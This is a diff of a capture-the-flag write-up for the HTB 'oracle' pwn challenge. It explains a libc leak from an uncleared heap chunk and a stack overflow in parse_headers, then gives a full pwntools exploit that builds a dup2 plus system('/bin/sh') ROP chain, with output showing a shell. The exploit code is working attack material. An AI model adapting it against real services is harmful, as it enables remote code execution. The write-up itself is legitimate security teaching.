@@ -46,6 +46,13 @@ Check the securities of the binary since we want to know what we're facing in a 
     PIE:      PIE enabled
 ```
 
+And as we can see, it's dynamically linked, which means it depends on the presence of these libraries in the system environment.
+
+```bash
+└─$  file oracle
+oracle: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab489f2c221f7a038087dbb2040dacac768865ab, for GNU/Linux 3.2.0, not stripped
+```
+
 Explaining one-by-one what we can identify here. `Partial RELRO` means that some parts of the binary are marked as read-only after relocation to prevent overwriting of certain sections of the binary. However, this is not that much of a problem since it doesn't protect the `GOT` (Global Offset Table) as the Full RELRO does. Stack canaries are not being used, making it easier to perform buffer overflow attacks without detections. No eXecute enabled means that pages marked as non-executable cannot be executed, which is a mitigation against executing shellcode placed on the stack or heap. Return-Oriented Programming (ROP) is a technique that can be used in these situations to bypass. PIE means the executable's code is loaded at a random base address, which is a form of ASLR at the binary level, making it more difficult to predict the address of specific functions or gadgets. In order to confirm this, we're going to check ASLR status.
 
 Hop into the local docker. This is assuming you've run the `./build_docker.sh`. Find out your container ID by running `docker ps`.
@@ -62,11 +69,35 @@ ctf@19dbe483fb3f:~$ cat /proc/sys/kernel/randomize_va_space
 
 A value of `0` means ASLR is disabled, `1` means it's partially enabled (conservative randomization), and `2` or higher typically indicates full ASLR is enabled. The use of `PIE` with the `oracle` binary, as indicated by the `checksec` output, aligns with ASLR by ensuring that the binary's code is loaded at a random base address each time it's executed. This randomization makes it significantly more difficult to predict where code might execute, complicating exploits that rely on hardcoded or guessed memory addresses, such as those used in buffer overflow attacks.
 
+We can also quickly check the presence and version of libc version from the local environment since we've got access to it.
+
+```bash
+ctf@f0c3c0de7947:~$ ldd oracle
+        linux-vdso.so.1 (0x00007ffd315fd000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa5cbd38000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fa5cbf33000)
+
+/lib/x86_64-linux-gnu/libc.so.6
+GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.14) stable release version 2.31.
+
+<redacted>
+
+ctf@f0c3c0de7947:~$ ls -la /lib/x86_64-linux-gnu/
+total 25652
+
+<redacted>
+-rwxr-xr-x  1 root root 2029592 Nov 22 13:32 libc-2.31.so
+lrwxrwxrwx  1 root root      12 Nov 22 13:32 libc.so.6 -> libc-2.31.so
+<redacted>
+```
+
 It's pretty satisfying that we are provided with the entire source code without being required to reverse the binary. Looking into the `oracle.c` we can almost immediately identify the vulnerabilities. 
 
 The first and most obvious vulnerability that we will exploit is leaking the `libc`. This is possible due to the `handle_plague` function. This initial vulnerability within `handle_plague` arises from insufficient validation of user-supplied input, leading to a heap-based buffer overflow. This vulnerability is going to be the entry point for our exploit, allowing both the leakage of libc addresses and the injection of the ROP chain.
 
-Below we can see where the problem arises: the function dynamically allocates a buffer on the heap to store data received from client based on the Content-Length header. However, it fails to properly validate the size of this incoming data against the allocated buffer's capacity. This is a buffer overflow condition. Leaking arbitrary memory locations, such as libc addresses, undermines the ASLR, and provides us with the critical piece of the puzzle to construct the ROP chain. Right from the `oracle.c` code, the `handle_plague` function:
+Below we can see where the problem arises: the function dynamically allocates a buffer on the heap to store data received from client based on the Content-Length header. However, it fails to properly validate the size of this incoming data against the allocated buffer's capacity. This being fixed size based on `MAX_PLAGUE_CONTENT_SIZE` with that malloc(). This is a buffer overflow condition. Leaking arbitrary memory locations, such as libc addresses, undermines the ASLR, and provides us with the critical piece of the puzzle to construct the ROP chain. 
+
+Right from the given `oracle.c` source code, the `handle_plague()` function:
 
 ```c
 void handle_plague() {
@@ -74,7 +105,7 @@ void handle_plague() {
         write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
         return;
     }
-
+    
     // take in the data
     char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
     char *plague_target = (char *)0x0;
@@ -115,11 +146,67 @@ void handle_plague() {
 }
 ```
 
-This is why we are going to approach this as a libc leak challenge. Our plan of attack is ROP gadgets to effectively navigate ASLR and PIE. First let's leak the libc address.
+This is why we are going to approach this as a libc leak challenge. Our plan of attack is leak + ROP to effectively navigate around ASLR and PIE.
 
-In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, tl;dr - enabling interactive access. This is what you will see when building up the payload for the ROP chain. 
+The bug in the code is due to the fact it doesn't zero out the chunk's content before it ends up reused. The `MAX_PLAGUE_CONTENT_SIZE` is defined as 2048, which means that when it's freed, it's going to be placed into the unsorted bin. Without being cleared this chuck, it's going to hold a libc address. To exploit this, by calling `handle_plague()` twice where the second invocation we are going to send only a null byte after the headers. Any other approach would work fine too, just send minimal data. It's going to leverage the application's memory handling vulnerability and expose libc address retained in the memory.
 
-Find below the entire code that does the job done. 
+Here's how it turns out what we're trying to do:
+
+```
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
+Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
+```
+
+The interesting part is after the Attempted plague, `\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00`.
+
+The response needs to be parsed, extract the leaked adress from the payload and adjust accordingly. The next vulnerability that we're going to exploit is `parse_headers()` function. Right away we can identify the lack of bounds checking and insufficient input validation. The loop is going to read byte-by-byte the received content and stores them into the header_buffer, which is fixed sized (`MAX_HEADER_DATA_SIZE`). However, it doesn't check whether the `i` in the `while` loop is going to exceeed header_buffer. The break condition is only when `\r\n\r\n` is received, which marks the end of the header. However, this check happens _after_ writing the byte into the buffer. Check below the attached code snippet from the `oracle.c` source code. 
+
+```c
+void parse_headers() {
+    // first input all of the header fields
+    ssize_t i = 0;
+    char byteRead;
+    char header_buffer[MAX_HEADER_DATA_SIZE];
+
+    while (1) {
+        recv(client_socket, &byteRead, sizeof(byteRead), 0);
+
+        // clean up the headers by removing extraneous newlines
+        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
+            header_buffer[i] = byteRead;
+
+        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
+            header_buffer[i-4] == '\0';
+            break;
+        }
+
+        i++;
+    }
+    < redacted >
+}
+```
+As such we have everything what we need to build up our ROP chain. libc address is successfully leaked out, and we know where the overflow is happening. By crafting our ROP payload we can carefully overwrite control data on the stack like the saved return address of `parse_headers` and as such redirect execution flow. It is time to hook up to GDB. Disassemble the `parse_headers` functions, find its ret address, attach breakpoint there, and we can see the registers and stack content at the snapshot - right before we've returned from parse_headers function. Send again, second invocation as mentioned earlier, then check the state.
+
+In order to attach gdb to your docker environment, you need to edit the build_docker file a bit. The `-p 9090:9090` is going to map the host port to docker container and the `--capp-add=SYS_PTRACE` grants the container permissions for tracing system calls. This is required by gdb since it facilitates remote debugging.
+
+```bash
+└─$ cat build_docker.sh 
+#!/bin/sh
+docker build --tag=oracle .
+docker run -it -p 9001:9001 -p 9090:9090 --cap-add=SYS_PTRACE --rm --name=oracle oracle
+```
+
+Once this is done, you just connect to the docker container and install gdb-server and run `gdbserver :9090 --attach $(pidof oracle)`, you can also do these in Dockerfile. 
+
+![image](https://github.com/respawnRW/writeups/assets/163560495/1e2d9054-53b9-4b02-9796-e41136d0e6d6)
+
+
+In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, enabling interactive access. This is what you will see when building up the payload for the ROP chain. 
+
+Find below the entire code that does the job done. The pwn script was adapted and comprehensively commented in great depth with multiple print statements during execution. 
 
 Run it without any arguments to execute it locally or run it with REMOTE argument to have it run remotely.
 
@@ -128,23 +215,41 @@ Run it without any arguments to execute it locally or run it with REMOTE argumen
 
 from pwn import *
 
+# Set up the binary context for pwntools
 context.binary = elf = ELF('./oracle')
-context.log_level = 'error'
+context.log_level = 'error'  # Reduce output verbosity
 
+# Function to establish a connection with the target
 def get_connection():
+    # Connect to the remote target if specified, otherwise connect locally for testing
     if args.REMOTE:
         return remote("94.237.54.170", 47106)
     else:
         return remote("localhost", 9001)
 
-def plague(target_competitor: str, include_plague_target: bool, content_length: int = 1000) -> bytes:
+# Function to send the PLAGUE command with controlled parameters
+def plague(target_competitor: str, include_plague_target: bool, content_length: int = 1000):
     io = get_connection()
-    io.send(b'PLAGUE ' + target_competitor.encode() + b' blah\r\n')
-    io.send(b'Content-Length: ' + str(content_length).encode() + b'\r\n')
-    if include_plague_target:
-        io.send(b'Plague-Target: blah')
-    io.send(b'\r\n\r\n')
-    io.send(b'\x00') # null byte to indicate end of request
+    # Construct the command with the target competitor's name
+    command = b'PLAGUE ' + target_competitor.encode() + b' blah\r\n'
+    # Specify the Content-Length header for the subsequent data
+    content_length_header = b'Content-Length: ' + str(content_length).encode() + b'\r\n'
+    # Conditionally include the Plague-Target header based on the flag
+    plague_target_header = b'Plague-Target: blah' if include_plague_target else b''
+    # End of headers and start of the actual data payload
+    end_of_headers = b'\r\n\r\n'
+    # The null byte to indicate the end of the request
+    end_of_request = b'\x00'
+
+    # Combine all parts to form the full payload
+    full_payload = command + content_length_header + plague_target_header + end_of_headers + end_of_request
+
+    # Print the payload being sent
+    print("Sending payload:")
+    print(full_payload)
+
+    # Send the constructed payload
+    io.send(full_payload)
     data = io.recvline()
     if not include_plague_target:
         data += io.recvline()
@@ -152,62 +257,74 @@ def plague(target_competitor: str, include_plague_target: bool, content_length: 
     io.close()
     return data
 
-# exploitation to trigger the vulnerability
+# Trigger the vulnerability and receive the initial leak
 plague("blah", True)
 data = plague("blah", False, content_length=64)
+print(f"Received data: ", data)
 
-# processing the leaked address
+# Extract the leaked libc address and adjust it
 leak = u64(data.split(b": ")[1][9:17])
-leak = leak << 8
-print(hex(leak))
+print(f"Raw leaked libc address: {hex(leak)}")
+leak = leak << 8  # Adjust the leaked address
+print(f"Leaked libc address (adjusted): {hex(leak)}")
 
-# calculating addresses for functions and gadgets within libc
+# Calculate libc base and other function/gadget addresses
 libc = ELF('./libc-2.31.so')
-libc.address = leak - 2018048
-system_addr = libc.symbols['system'] # address of 'system' function
+libc.address = leak - 2018048  # Calculate the libc base address
+system_addr = libc.symbols['system']
 pop_rdi = libc.address + 0x0000000000023b6a
 pop_rsi = libc.address + 0x000000000002601f
 ret = libc.address + 0x0000000000022679
-binsh = next(libc.search(b'/bin/sh')) # address of '/bin/sh'
-dup2 = libc.symbols['dup2'] # address of dup2 function
+binsh = next(libc.search(b'/bin/sh'))
+dup2 = libc.symbols['dup2']
 
-offset = 2127 # offset from start of the buffer to the return address on stack
+# Print calculated addresses for debugging
+print(f"system() address: {hex(system_addr)}")
+print(f"pop_rdi gadget address: {hex(pop_rdi)}")
+print(f"pop_rsi gadget address: {hex(pop_rsi)}")
+print(f"ret gadget address: {hex(ret)}")
+print(f"'/bin/sh' string address: {hex(binsh)}")
+print(f"dup2 function address: {hex(dup2)}")
 
-# establish connection for payload delivery
+# Establish a connection and prepare for payload delivery
+offset = 2127  # Buffer offset to control return address
 io = get_connection()
 io.send(b'VIEW me 1.0\r\n')
 
-# ROP chain payload
+# Pause before sending the payload for manual intervention or review
+input("Press any key to send the payload...")
+
+# Construct and send the payload for exploitation
 payload = flat(
-    b'A' * offset,      # overflow the buffer to the return address
-    pop_rdi,            # pop next value into RDI
-    0x6,                # argument for dup2 file descriptor
-    pop_rsi,
-    0x0,
-    dup2,               # call dup2 to duplicate file descriptor
-    pop_rdi,
-    0x6,                # repeat for stdout
-    pop_rsi,
-    0x1,
-    dup2,               # duplicate file descriptor again
-    pop_rdi,
-    binsh,              # prepare the shell as argument for system
-    ret,                # ensuring stack alignement
-    system_addr         # call system("/bin/sh") to spawn
+    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
+    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
+    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
 )
-
-# send the crafted payload
 io.send(payload + b'\r\n\r\n')
-io.interactive()
-io.close()
+io.interactive()  # Switch to interactive mode after sending the payload
+io.close()  # Close the connection after exploitation
 ```
 
+Don't forget to run the docker build and have it running locally in your environment.
+
 ```
-[*] '/ctf_2024/pwn_oracle/challenge/oracle'
-<redacted>
-0x7fceacf7fb00
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
+Sending payload:
+b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
+Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
+Raw leaked libc address: 0x7f1257321b
+Leaked libc address (adjusted): 0x7f1257321b00
+system() address: 0x7f1257187290
+pop_rdi gadget address: 0x7f1257158b6a
+pop_rsi gadget address: 0x7f125715b01f
+ret gadget address: 0x7f1257157679
+'/bin/sh' string address: 0x7f12572e95bd
+dup2 function address: 0x7f1257243ae0
+Press any key to send the payload...
 You have found yourself.
-
+$ whoami
+ctf
 $ cat flag.txt
 HTB{f4k3_fL4G_f0R_t3sTiNg}
 ```
